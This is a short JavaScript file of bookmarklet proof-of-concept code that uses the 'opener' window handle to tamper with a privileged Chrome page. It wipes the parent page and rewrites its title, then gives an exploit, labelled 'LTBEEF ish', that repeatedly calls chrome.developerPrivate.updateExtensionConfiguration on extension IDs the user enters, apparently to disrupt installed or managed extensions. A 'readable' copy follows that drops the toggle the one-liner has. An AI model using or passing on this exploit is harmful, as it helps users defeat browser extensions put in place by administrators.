//Remove all content from parent page
javascript:
var e = opener.document.getElementsByTagName('html')[0];
e.removeChild(opener.document.body);

//POC: Add new content on page

//      Element to change:
//      <h2 id="app-title" class="items-container">Chrome Apps</h2>
var e = opener.document.getElementById('app-title');
e.innerHTML = "POC";

//Point blank explot - LTBEEF ish (NOT MADE BY ME)
let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 250);

//Readable bookmarklet
let shim = false;
var ids = prompt("extension ids (comma separated)").split(",");
setInterval(()=>{
    ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({
        extensionId: id,
        fileAccess: shim
    }));
},
250)

